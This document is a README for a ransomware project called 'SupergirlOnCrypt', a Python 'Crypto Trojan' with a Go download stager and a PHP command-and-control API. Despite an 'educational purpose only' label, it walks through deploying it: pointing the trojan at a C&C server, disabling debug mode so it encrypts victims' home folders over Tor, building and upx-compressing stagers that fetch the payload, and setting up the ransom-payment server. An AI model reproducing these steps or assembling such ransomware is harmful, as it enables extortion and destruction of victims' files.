# SupergirlOnCrypt :heart: :punch: :boom:

![Project Logo](https://thoughtful-dev.com/projects/supergirloncrypt/header.jpg)

**You currently cant decrypt Files unless you set the `locked` column in the database for this PC to `0`. I will try to add something other than Bitcoin Payment. Maybe some Supergirl Questions?**

**For EDUCATIONAL PURPOSE ONLY**

This is a Crypto Trojan written in Python which can be packed using Pyinstaller... 
and i :heart: Supergirl so there you go.

## Requirements

Both Windows AND Linux must have Python >= 3.5 installed to build the Executable/Binary.

Optionally you need the Golang compiler if you want to use the Go Stager because the Binary with Pyinstaller is quite large (~60mb - Linux , 30mb - Windows)
(Go Stager is only ~700kb).

---
## Setup

We will generate the APIÂ´s public and private key in this process.
So if you first generate a binary for Linux as shown here then you have to copy the whole repository folder to the windows box and only choose to recreate the `venv`.
## The Trojan

1. Change the API_URL in App/Config.py to your C&C Server URL
2. Disable DEBUG_MODE (Leave it on if your API is running locally because otherwise Tor cant reach your local network)
3. Optionally change your File Types
4. Build Executables/Binary for Windows and/or Linux
5. Setup API

## Overview of DEBUG True vs False
Debug On | Debug Off
------------ | -------------
Creates a logfile | No logfile
Does not user Tor | Uses Tor to communicate
Encrypts Folder `./test_files` | Encrypts Users HomeFolder

**If you are Testing leave the DEBUG MODE ON OR USE A VM**


## Building

### Linux
```
$ cd Scripts
$ ./supergirl.sh setup python3
$ ./supergirl.sh build
```
**Now copy the whole folder to the Windows VM/Machine where you want to build the Windows Executable. When running the `supergirl.ps1` ONLY recreate the `venv` and NOT the Keys since they are already generated from our Linux Setup.** *

*Optionally you can also clone the Repo to the Windows Machine and only replace `API/bin/private.key` and `App/res/server.public.key`

**This also applies vice versa**

### Windows
```
PS> cd Scripts
PS> .\supergirl.ps1 -mode setup -path C:\\...\\python.exe
PS> .\supergirl.ps1 -mode build
```

### Building Stager
1. Upload your Binary which you gathered from the previous step
2. Go to `./Stagers/Go` and open `main.go`
3. Change line 39 `var url string = "your-direct-download-url-here"`

#### Building a Linux Stager
4. `GOOS=linux go build -ldflags="-s -w" -o stager main.go`

#### Building a Windows Stager
5. `GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o stager.exe main.go`

6. Optionally compress the Stager(.exe) binary with upx

7. LINUX: `upx --ultra-brute -o compressed_stager stager`
7. WINDOWS: `upx.exe --ultra-brute -o compressed_stager.exe stager.exe`

8. Wait...
9. ???
10. Profit.


## API

Since we communicate with our API we need to set it up. The API(located in ./API duhh) is written in PHP so any Linux /Win Server will do.
On your Ubuntu C&C Server run:
```
$ sudo add-apt-repository ppa:ondrej/php
$ sudo apt update
$ sudo apt install apache2 php7.1 php7.1-mbstring php7.1-sqlite3 php7.1-xml
$ sudo apt install composer
```
Now copy the API Folder to your Server in the www root
```
$ cd <web-root>
$ composer install
```
We need to install python to decrypt our keys if a user wants to decrypt
```
$ sudo apt install python3 python3-dev python3-pip
$ cd <web-root>
$ pip install cryptography
```
Your API should now be ready on http://ip/public (should respond with 501)

**I wont show you how to setup a Tor hidden Service**
